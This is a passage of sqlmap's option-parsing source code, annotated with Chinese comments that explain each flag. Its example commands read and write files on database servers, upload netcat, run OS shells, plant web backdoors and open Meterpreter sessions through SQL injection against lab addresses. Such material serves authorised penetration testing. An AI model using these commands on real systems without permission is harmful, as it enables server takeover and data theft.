        1、MySQL数据库版本小于5.0，没有information_schema表。
        2、数据库是Microssoft Access，系统表MSysObjects是不可读的（默认）。
        3、当前用户没有权限读取系统中保存数据结构的表的权限。
        暴力破解的表在txt/common-tables.txt文件中，你可以自己添加。
        列举一个MySQL 4.1的例子：
        $ python sqlmap.py -u "http://192.168.136.129/mysql/get_int_4.php?id=1" --common-tables -D testdb --banner
        '''
        brute.add_option("--common-tables", dest="commonTables", action="store_true",
                               help="Check existence of common tables")

        '''暴力破解列名
        参数：--common-columns
        与暴力破解表名一样，暴力跑的列名在txt/common-columns.txt中。
        '''
        brute.add_option("--common-columns", dest="commonColumns", action="store_true",
                               help="Check existence of common columns")

        '''用户自定义函数注入
        参数：--udf-inject,--shared-lib
        你可以通过编译MySQL注入你自定义的函数（UDFs）或PostgreSQL在windows中共享库，DLL，或者Linux/Unix中共享对象，
        sqlmap将会问你一些问题，上传到服务器数据库自定义函数，然后根据你的选择执行他们，当你注入完成后，sqlmap将会移除它们。
        '''
        # User-defined function options
        udf = OptionGroup(parser, "User-defined function injection", "These "
                          "options can be used to create custom user-defined "
                          "functions")

        udf.add_option("--udf-inject", dest="udfInject", action="store_true",
                       help="Inject custom user-defined functions")

        udf.add_option("--shared-lib", dest="shLib",
                       help="Local path of the shared library")

        # File system options  系统文件操作
        filesystem = OptionGroup(parser, "File system access", "These options "
                                 "can be used to access the back-end database "
                                 "management system underlying file system")

        '''
        参数：--file-read
        当数据库为MySQL，PostgreSQL或Microsoft SQL Server，并且当前用户有权限使用特定的函数。读取的文件可以是文本也可以是二进制文件。
        例如：
        列举一个Microsoft SQL Server 2005的例子：
        $ python sqlmap.py -u "http://192.168.136.129/sqlmap/mssql/iis/get_str2.asp?name=luther" --file-read "C:/example.exe" -v 1
        '''
        filesystem.add_option("--file-read", dest="rFile",
                              help="Read a file from the back-end DBMS "
                                   "file system")

        '''把文件上传到数据库服务器中
        参数：--file-write,--file-dest
        当数据库为MySQL，PostgreSQL或Microsoft SQL Server，并且当前用户有权限使用特定的函数。上传的文件可以是文本也可以是二进制文件。
        列举一个MySQL的例子：
        $ file /software/nc.exe.packed
        /software/nc.exe.packed: PE32 executable for MS Windows (console) Intel 80386 32-bit
        $ ls -l /software/nc.exe.packed
        -rwxr-xr-x 1 inquis inquis 31744 2009-MM-DD hh:mm /software/nc.exe.packed

        $ python sqlmap.py -u "http://192.168.136.129/sqlmap/mysql/get_int.aspx?id=1" --file-write "/software/nc.exe.packed" --file-dest "C:/WINDOWS/Temp/nc.exe" -v 1
        '''
        filesystem.add_option("--file-write", dest="wFile",
                              help="Write a local file on the back-end "
                                   "DBMS file system")

        filesystem.add_option("--file-dest", dest="dFile",
                              help="Back-end DBMS absolute filepath to "
                                   "write to")

        # Takeover options
        takeover = OptionGroup(parser, "Operating system access", "These "
                               "options can be used to access the back-end "
                               "database management system underlying "
                               "operating system")

        '''运行任意操作系统命令
        参数：--os-cmd,--os-shell
        当数据库为MySQL，PostgreSQL或Microsoft SQL Server，并且当前用户有权限使用特定的函数。
        在MySQL、PostgreSQL，sqlmap上传一个二进制库，包含用户自定义的函数，sys_exec()和sys_eval()。
        那么他创建的这两个函数可以执行系统命令。在Microsoft SQL Server，sqlmap将会使用xp_cmdshell存储过程，如果被禁（在Microsoft SQL Server 2005及以上版本默认禁制），sqlmap会重新启用它，如果不存在，会自动创建。
        列举一个PostgreSQL的例子：
        $ python sqlmap.py -u "http://192.168.136.131/sqlmap/pgsql/get_int.php?id=1" --os-cmd id -v 1

        用--os-shell参数也可以模拟一个真实的shell，可以输入你想执行的命令。
        当不能执行多语句的时候（比如php或者asp的后端数据库为MySQL时），仍然可能使用INTO OUTFILE写进可写目录，来创建一个web后门。
        支持的语言：
        1、ASP
        2、ASP.NET
        3、JSP
        4、PHP
        '''
        takeover.add_option("--os-cmd", dest="osCmd",
                            help="Execute an operating system command")

        takeover.add_option("--os-shell", dest="osShell",
                            action="store_true",
                            help="Prompt for an interactive operating "
                                 "system shell")

        '''Meterpreter配合使用
        参数：--os-pwn,--os-smbrelay,--os-bof,--priv-esc,--msf-path,--tmp-path
        当数据库为MySQL，PostgreSQL或Microsoft SQL Server，并且当前用户有权限使用特定的函数，可以在数据库与攻击者直接建立TCP连接，这个连接可以是一个交互式命令行的Meterpreter会话，sqlmap根据Metasploit生成shellcode，并有四种方式执行它：
            1、通过用户自定义的sys_bineval()函数在内存中执行Metasplit的shellcode，支持MySQL和PostgreSQL数据库，参数：--os-pwn。
            2、通过用户自定义的函数上传一个独立的payload执行，MySQL和PostgreSQL的sys_exec()函数，Microsoft SQL Server的xp_cmdshell()函数，参数：--os-pwn。
            3、通过SMB攻击(MS08-068)来执行Metasploit的shellcode，当sqlmap获取到的权限足够高的时候（Linux/Unix的uid=0，Windows是Administrator），--os-smbrelay。
            4、通过溢出Microsoft SQL Server 2000和2005的sp_replwritetovarbin存储过程(MS09-004)，在内存中执行Metasploit的payload，参数：--os-bof
        列举一个MySQL例子：
        $ python sqlmap.py -u "http://192.168.136.129/sqlmap/mysql/iis/get_int_55.aspx?id=1" --os-pwn --msf-path /software/metasploit

        '''
        takeover.add_option("--os-pwn", dest="osPwn",
                            action="store_true",
                            help="Prompt for an OOB shell, "
                                 "Meterpreter or VNC")

        takeover.add_option("--os-smbrelay", dest="osSmb",
                            action="store_true",
                            help="One click prompt for an OOB shell, "
                                 "Meterpreter or VNC")

        takeover.add_option("--os-bof", dest="osBof",
                            action="store_true",
                            help="Stored procedure buffer overflow "
                                 "exploitation")

        takeover.add_option("--priv-esc", dest="privEsc",
                            action="store_true",
                            help="Database process user privilege escalation")

        takeover.add_option("--msf-path", dest="msfPath",
                            help="Local path where Metasploit Framework "
                                 "is installed")

        takeover.add_option("--tmp-path", dest="tmpPath",
                            help="Remote absolute path of temporary files "
                                 "directory")

        # Windows registry options  对Windows注册表操作
        windows = OptionGroup(parser, "Windows registry access", "These "
                               "options can be used to access the back-end "
                               "database management system Windows "
                               "registry")

        '''读取注册表值
        参数：--reg-read
        '''
        windows.add_option("--reg-read", dest="regRead",
                            action="store_true",
                            help="Read a Windows registry key value")

        '''写入注册表值
        参数：--reg-add
        '''
        windows.add_option("--reg-add", dest="regAdd",
                            action="store_true",
                            help="Write a Windows registry key value data")

        '''删除注册表值
        参数：--reg-del
        '''
        windows.add_option("--reg-del", dest="regDel",
                            action="store_true",
                            help="Delete a Windows registry key value")

        '''注册表辅助选项
        参数：--reg-key，--reg-value，--reg-data，--reg-type
        需要配合之前三个参数使用，例子：
        $ python sqlmap.py -u http://192.168.136.129/sqlmap/pgsql/get_int.aspx?id=1 --reg-add --reg-key="HKEY_LOCAL_MACHINE\SOFTWARE\sqlmap" --reg-value=Test --reg-type=REG_SZ --reg-data=1
        '''
        windows.add_option("--reg-key", dest="regKey",
                            help="Windows registry key")

        windows.add_option("--reg-value", dest="regVal",
                            help="Windows registry key value")

        windows.add_option("--reg-data", dest="regData",
                            help="Windows registry key value data")

        windows.add_option("--reg-type", dest="regType",
                            help="Windows registry key value type")

        # General options 常规参数
        general = OptionGroup(parser, "General", "These options can be used "
                             "to set some general working parameters")

        #general.add_option("-x", dest="xmlFile",
        #                    help="Dump the data into an XML file")

        '''从sqlite中读取session
        参数：-s
        sqlmap对每一个目标都会在output路径下自动生成一个SQLite文件，如果用户想指定读取的文件路径，就可以用这个参数。
        '''
        general.add_option("-s", dest="sessionFile",
                            help="Load session from a stored (.sqlite) file")

        '''保存HTTP(S)日志
        参数：-t
        这个参数需要跟一个文本文件，sqlmap会把HTTP(S)请求与响应的日志保存到那里。
        '''
        general.add_option("-t", dest="trafficFile",
                            help="Log all HTTP traffic into a "
                            "textual file")

        '''非交互模式
        参数：--batch
        用此参数，不需要用户输入，将会使用sqlmap提示的默认值一直运行下去。
        '''
        general.add_option("--batch", dest="batch",
                            action="store_true",
                            help="Never ask for user input, use the default behaviour")

        general.add_option("--binary-fields", dest="binaryFields",
                          help="Result fields having binary values (e.g. \"digest\")")

        '''强制使用字符编码
        参数：--charset
        不使用sqlmap自动识别的（如HTTP头中的Content-Type）字符编码，强制指定字符编码如：
        --charset=GBK
        '''
        general.add_option("--charset", dest="charset",
                            help="Force character encoding used for data retrieval")

        '''爬行网站URL
        参数：--crawl
        sqlmap可以收集潜在的可能存在漏洞的连接，后面跟的参数是爬行的深度。
        例子：
        $ python sqlmap.py -u "http://192.168.21.128/sqlmap/mysql/" --batch --crawl=3
        '''
        general.add_option("--crawl", dest="crawlDepth", type="int",
                            help="Crawl the website starting from the target URL")

        general.add_option("--crawl-exclude", dest="crawlExclude",
                           help="Regexp to exclude pages from crawling (e.g. \"logout\")")

        '''规定输出到CSV中的分隔符
        参数：--csv-del
        当dump保存为CSV格式时（--dump-format=CSV），需要一个分隔符默认是逗号，用户也可以改为别的 如：
        --csv-del=";"
        '''
        general.add_option("--csv-del", dest="csvDel",
                                  help="Delimiting character used in CSV output "
                                  "(default \"%s\")" % defaults.csvDel)

        '''定义dump数据的格式
        参数：--dump-format
        输出的格式可定义为：CSV，HTML，SQLITE
        '''
        general.add_option("--dump-format", dest="dumpFormat",
                                  help="Format of dumped data (CSV (default), HTML or SQLITE)")

        '''预估完成时间
        参数：--eta
        可以计算注入数据的剩余时间。
        例如Oracle的布尔型盲注：
        $ python sqlmap.py -u "http://192.168.136.131/sqlmap/oracle/get_int_bool.php?id=1" -b --eta
        sqlmap先输出长度，预计完成时间，显示百分比，输出字符
        '''
        general.add_option("--eta", dest="eta",
                            action="store_true",
                            help="Display for each output the "
                                 "estimated time of arrival")

        '''刷新session文件
        参数：--flush-session
        如果不想用之前缓存这个目标的session文件，可以使用这个参数。 会清空之前的session，重新测试该目标。
        '''
        general.add_option("--flush-session", dest="flushSession",
                            action="store_true",
                            help="Flush session files for current target")

        '''自动获取form表单测试
        参数：--forms
        如果你想对一个页面的form表单中的参数测试，可以使用-r参数读取请求文件，或者通过--data参数测试。
        但是当使用--forms参数时，sqlmap会自动从-u中的url获取页面中的表单进行测试。
        '''
        general.add_option("--forms", dest="forms",
                                  action="store_true",
                                  help="Parse and test forms on target URL")

        '''忽略在会话文件中存储的查询结果
        参数：--fresh-queries
        忽略session文件保存的查询，重新查询。
        '''
        general.add_option("--fresh-queries", dest="freshQueries",
                            action="store_true",
                            help="Ignore query results stored in session file")

        '''使用DBMS的hex函数
        参数：--hex
        有时候字符编码的问题，可能导致数据丢失，可以使用hex函数来避免：
        针对PostgreSQL例子：
        $ python sqlmap.py -u "http://192.168.48.130/sqlmap/pgsql/get_int.php?id=1" --banner --hex -v 3 --parse-errors
        '''
        general.add_option("--hex", dest="hexConvert",
                            action="store_true",
                            help="Use DBMS hex function(s) for data retrieval")

        '''自定义输出的路径
        参数：--output-dir
        sqlmap默认把session文件跟结果文件保存在output文件夹下，用此参数可自定义输出路径 例如：--output-dir=/tmp
        '''
        general.add_option("--output-dir", dest="outputDir",
                            action="store",
                            help="Custom output directory path")

        '''从响应中获取DBMS的错误信息
        参数：--parse-errors
        有时目标没有关闭DBMS的报错，当数据库语句错误时，会输出错误语句，用此参数可以会显出错误信息。
        $ python sqlmap.py -u "http://192.168.21.129/sqlmap/mssql/iis/get_int.asp?id=1" --parse-errors
        '''
        general.add_option("--parse-errors", dest="parseErrors",
                                  action="store_true",
                                  help="Parse and display DBMS error messages from responses")

        general.add_option("--save", dest="saveConfig",
                            help="Save options to a configuration INI file")

        '''利用正则过滤目标网址
        参数：--scope
        例如：python sqlmap.py -l burp.log --scope="(www)?\.target\.(com|net|org)"
        '''
        general.add_option("--scope", dest="scope",
                           help="Regexp to filter targets from provided proxy log")

        general.add_option("--test-filter", dest="testFilter",
                           help="Select tests by payloads and/or titles (e.g. ROW)")

        general.add_option("--test-skip", dest="testSkip",
                           help="Skip tests by payloads and/or titles (e.g. BENCHMARK)")

        general.add_option("--update", dest="updateAll",
                            action="store_true",
                            help="Update sqlmap")

        # Miscellaneous options  其他的一些参数
        miscellaneous = OptionGroup(parser, "Miscellaneous")

        '''使用参数缩写
        参数：-z
        有使用参数太长太复杂，可以使用缩写模式。 例如：
        python sqlmap.py --batch --random-agent --ignore-proxy --technique=BEU -u "www.target.com/vuln.php?id=1"
        可以写成：
        python sqlmap.py -z "bat,randoma,ign,tec=BEU" -u "www.target.com/vuln.php?id=1"
        还有：
        python sqlmap.py --ignore-proxy --flush-session --technique=U --dump -D testdb -T users -u "www.target.com/vuln.php?id=1"
        可以写成：
        python sqlmap.py -z "ign,flu,bat,tec=U,dump,D=testdb,T=users" -u "www.target.com/vuln.php?id=1"
        '''
        miscellaneous.add_option("-z", dest="mnemonics",
                               help="Use short mnemonics (e.g. \"flu,bat,ban,tec=EU\")")

        '''成功SQL注入时警告
        参数：--alert
        '''
        miscellaneous.add_option("--alert", dest="alert",
                                  help="Run host OS command(s) when SQL injection is found")

        '''设定会话的答案
        参数：--answers
        当希望sqlmap提出输入时，自动输入自己想要的答案可以使用此参数： 例子：
        $ python sqlmap.py -u "http://192.168.22.128/sqlmap/mysql/get_int.php?id=1"--technique=E --answers="extending=N" --batch
        '''
        miscellaneous.add_option("--answers", dest="answers",
                                  help="Set question answers (e.g. \"quit=N,follow=N\")")

        '''发现SQL注入时发出蜂鸣声
        参数：--beep
        发现sql注入时，发出蜂鸣声。
        '''
        miscellaneous.add_option("--beep", dest="beep", action="store_true",
                                  help="Beep on question and/or when SQL injection is found")

        '''清理sqlmap的UDF(s)和表
        参数：--cleanup
        清除sqlmap注入时产生的udf与表。
        '''
        miscellaneous.add_option("--cleanup", dest="cleanup",
                                  action="store_true",
                                  help="Clean up the DBMS from sqlmap specific "
                                  "UDF and tables")

        miscellaneous.add_option("--dependencies", dest="dependencies",
                                  action="store_true",
                                  help="Check for missing (non-core) sqlmap dependencies")

        '''禁用彩色输出
        参数：--disable-coloring
        sqlmap默认彩色输出，可以使用此参数，禁掉彩色输出。
        '''
        miscellaneous.add_option("--disable-coloring", dest="disableColoring",
                                  action="store_true",
                                  help="Disable console output coloring")

        '''使用指定的Google结果页面
        参数：--gpage
        默认sqlmap使用前100个URL地址作为注入测试，结合此选项，可以指定页面的URL测试。
        '''
        miscellaneous.add_option("--gpage", dest="googlePage", type="int",
                                  help="Use Google dork results from specified page number")

        '''启发式检测WAF/IPS/IDS保护
        参数：--check-waf
        WAF/IPS/IDS保护可能会对sqlmap造成很大的困扰，如果怀疑目标有此防护的话，可以使用此参数来测试。 sqlmap将会使用一个不存在的参数来注入测试
        例如：
        &foobar=AND 1=1 UNION ALL SELECT 1,2,3,table_name FROM information_schema.tables WHERE 2>1
        如果有保护的话可能返回结果会不同。

        测试WAF/IPS/IDS保护
        参数：--identify-waf
        sqlmap可以尝试找出WAF/IPS/IDS保护，方便用户做出绕过方式。目前大约支持30种产品的识别。
        例如对一个受到ModSecurity WAF保护的MySQL例子：
        $ python sqlmap.py -u "http://192.168.21.128/sqlmap/mysql/get_int.php?id=1" --identify-waf -v 3
        '''
        miscellaneous.add_option("--identify-waf", dest="identifyWaf",
                                  action="store_true",
                                  help="Make a thorough testing for a WAF/IPS/IDS protection")

        '''模仿智能手机
        参数：--mobile
        有时服务端只接收移动端的访问，此时可以设定一个手机的User-Agent来模仿手机登陆。
        例如：$ python sqlmap.py -u "http://www.target.com/vuln.php?id=1" --mobile
        '''
        miscellaneous.add_option("--mobile", dest="mobile",
                                  action="store_true",
                                  help="Imitate smartphone through HTTP User-Agent header")

        miscellaneous.add_option("--offline", dest="offline",
                                  action="store_true",
                                  help="Work in offline mode (only use session data)")

        miscellaneous.add_option("--page-rank", dest="pageRank",
                                  action="store_true",
                                  help="Display page rank (PR) for Google dork results")

        '''安全的删除output目录的文件
        参数：--purge-output
        有时需要删除结果文件，而不被恢复，可以使用此参数，原有文件将会被随机的一些文件覆盖。
        例如：$ python sqlmap.py --purge-output -v 3
        '''
        miscellaneous.add_option("--purge-output", dest="purgeOutput",
                                  action="store_true",
                                  help="Safely remove all content from output directory")

        miscellaneous.add_option("--skip-waf", dest="skipWaf",
                                  action="store_true",
                                  help="Skip heuristic detection of WAF/IPS/IDS protection")

        '''启发式判断注入
        参数：--smart
        有时对目标非常多的URL进行测试，为节省时间，只对能够快速判断为注入的报错点进行注入，可以使用此参数。
        例子：$ python sqlmap.py -u "http://192.168.21.128/sqlmap/mysql/get_int.php?ca=17&user=foo&id=1" --batch --smart
        '''
        miscellaneous.add_option("--smart", dest="smart",
                                  action="store_true",
                                  help="Conduct thorough tests only if positive heuristic(s)")

        miscellaneous.add_option("--sqlmap-shell", dest="sqlmapShell", action="store_true",
                                  help="Prompt for an interactive sqlmap shell")

        miscellaneous.add_option("--tmp-dir", dest="tmpDir",
                                  help="Local directory for storing temporary files")

        '''初级用户向导参数
        参数：--wizard 面向初级用户的参数，可以一步一步教你如何输入针对目标注入。
        $ python sqlmap.py --wizard
        '''
        miscellaneous.add_option("--wizard", dest="wizard",
                                  action="store_true",
                                  help="Simple wizard interface for beginner users")

        # Hidden and/or experimental options
        parser.add_option("--dummy", dest="dummy", action="store_true",
                          help=SUPPRESS_HELP)

        parser.add_option("--pickled-options", dest="pickledOptions",
                          help=SUPPRESS_HELP)

        parser.add_option("--disable-precon", dest="disablePrecon", action="store_true",
                          help=SUPPRESS_HELP)

        parser.add_option("--profile", dest="profile", action="store_true",
                          help=SUPPRESS_HELP)

        parser.add_option("--force-dns", dest="forceDns", action="store_true",
                          help=SUPPRESS_HELP)

        parser.add_option("--force-threads", dest="forceThreads", action="store_true",
                          help=SUPPRESS_HELP)

        parser.add_option("--smoke-test", dest="smokeTest", action="store_true",
                          help=SUPPRESS_HELP)

        parser.add_option("--live-test", dest="liveTest", action="store_true",
                          help=SUPPRESS_HELP)

        parser.add_option("--stop-fail", dest="stopFail", action="store_true",
                          help=SUPPRESS_HELP)

        parser.add_option("--run-case", dest="runCase", help=SUPPRESS_HELP)

        parser.add_option_group(target)
        parser.add_option_group(request)
        parser.add_option_group(optimization)
        parser.add_option_group(injection)
        parser.add_option_group(detection)
        parser.add_option_group(techniques)
        parser.add_option_group(fingerprint)
        parser.add_option_group(enumeration)
        parser.add_option_group(brute)
        parser.add_option_group(udf)
        parser.add_option_group(filesystem)
        parser.add_option_group(takeover)
        parser.add_option_group(windows)
        parser.add_option_group(general)
        parser.add_option_group(miscellaneous)

        # Dirty hack to display longer options without breaking into two lines
        def _(self, *args):
            retVal = parser.formatter._format_option_strings(*args)
            if len(retVal) > MAX_HELP_OPTION_LENGTH:
                retVal = ("%%.%ds.." % (MAX_HELP_OPTION_LENGTH - parser.formatter.indent_increment)) % retVal
            return retVal

        parser.formatter._format_option_strings = parser.formatter.format_option_strings
        parser.formatter.format_option_strings = type(parser.formatter.format_option_strings)(_, parser, type(parser))

        # Dirty hack for making a short option '-hh'
        option = parser.get_option("--hh")
        option._short_opts = ["-hh"]
        option._long_opts = []

        # Dirty hack for inherent help message of switch '-h'
        option = parser.get_option("-h")
        option.help = option.help.capitalize().replace("this help", "basic help")

        _ = []
        prompt = False
        advancedHelp = True
        extraHeaders = []

        for arg in argv:
            _.append(getUnicode(arg, encoding=sys.getfilesystemencoding()))

        argv = _
        checkDeprecatedOptions(argv)

        prompt = "--sqlmap-shell" in argv

        if prompt:
            parser.usage = ""
            cmdLineOptions.sqlmapShell = True

            _ = ["x", "q", "exit", "quit", "clear"]

            for option in parser.option_list:
                _.extend(option._long_opts)
                _.extend(option._short_opts)

            for group in parser.option_groups:
                for option in group.option_list:
                    _.extend(option._long_opts)
                    _.extend(option._short_opts)

            autoCompletion(AUTOCOMPLETE_TYPE.SQLMAP, commands=_)

            while True:
                command = None

                try:
                    command = raw_input("sqlmap-shell> ").strip()
                    command = getUnicode(command, encoding=sys.stdin.encoding)
                except (KeyboardInterrupt, EOFError):
                    print
                    raise SqlmapShellQuitException

                if not command:
                    continue
                elif command.lower() == "clear":
                    clearHistory()
                    print "[i] history cleared"
                    saveHistory(AUTOCOMPLETE_TYPE.SQLMAP)
                elif command.lower() in ("x", "q", "exit", "quit"):
                    raise SqlmapShellQuitException
                elif command[0] != '-':
                    print "[!] invalid option(s) provided"
                    print "[i] proper example: '-u http://www.site.com/vuln.php?id=1 --banner'"
                else:
                    saveHistory(AUTOCOMPLETE_TYPE.SQLMAP)
                    loadHistory(AUTOCOMPLETE_TYPE.SQLMAP)
                    break

            try:
                for arg in shlex.split(command):
                    argv.append(getUnicode(arg, encoding=sys.stdin.encoding))
            except ValueError, ex:
                raise SqlmapSyntaxException, "something went wrong during command line parsing ('%s')" % ex.message

        # Hide non-basic options in basic help case
        for i in xrange(len(argv)):
            if argv[i] == "-hh":
                argv[i] = "-h"
            elif re.search(r"\A-\w=.+", argv[i]):
                print "[!] potentially miswritten (illegal '=') short option detected ('%s')" % argv[i]
            elif argv[i] == "-H":
                if i + 1 < len(argv):
                    extraHeaders.append(argv[i + 1])
            elif re.match(r"\A\d+!\Z", argv[i]) and argv[max(0, i - 1)] == "--threads" or re.match(r"\A--threads.+\d+!\Z", argv[i]):
                argv[i] = argv[i][:-1]
                conf.skipThreadCheck = True
            elif argv[i] == "--version":
                print VERSION_STRING.split('/')[-1]
                raise SystemExit
            elif argv[i] == "-h":
                advancedHelp = False
                for group in parser.option_groups[:]:
                    found = False
                    for option in group.option_list:
                        if option.dest not in BASIC_HELP_ITEMS:
                            option.help = SUPPRESS_HELP
                        else:
                            found = True
                    if not found:
                        parser.option_groups.remove(group)

        try:
            (args, _) = parser.parse_args(argv)
        except UnicodeEncodeError, ex:
            print "\n[!] %s" % ex.object.encode("unicode-escape")
            raise SystemExit
        except SystemExit:
            if "-h" in argv and not advancedHelp:
                print "\n[!] to see full list of options run with '-hh'"
            raise

        if extraHeaders:
            if not args.headers:
                args.headers = ""
            delimiter = "\\n" if "\\n" in args.headers else "\n"
            args.headers += delimiter + delimiter.join(extraHeaders)

        # Expand given mnemonic options (e.g. -z "ign,flu,bat")
        for i in xrange(len(argv) - 1):
            if argv[i] == "-z":
                expandMnemonics(argv[i + 1], parser, args)

        if args.dummy:
            args.url = args.url or DUMMY_URL

        if not any((args.direct, args.url, args.logFile, args.bulkFile, args.googleDork, args.configFile, \
            args.requestFile, args.updateAll, args.smokeTest, args.liveTest, args.wizard, args.dependencies, \
            args.purgeOutput, args.pickledOptions, args.sitemapUrl)):
            errMsg = "missing a mandatory option (-d, -u, -l, -m, -r, -g, -c, -x, --wizard, --update, --purge-output or --dependencies), "
            errMsg += "use -h for basic or -hh for advanced help"
            parser.error(errMsg)

        return args

    except (OptionError, TypeError), e:
        parser.error(e)

    except SystemExit:
        # Protection against Windows dummy double clicking
        if IS_WIN:
            print "\nPress Enter to continue...",
            raw_input()
        raise

    debugMsg = "parsing command line"
    logger.debug(debugMsg)
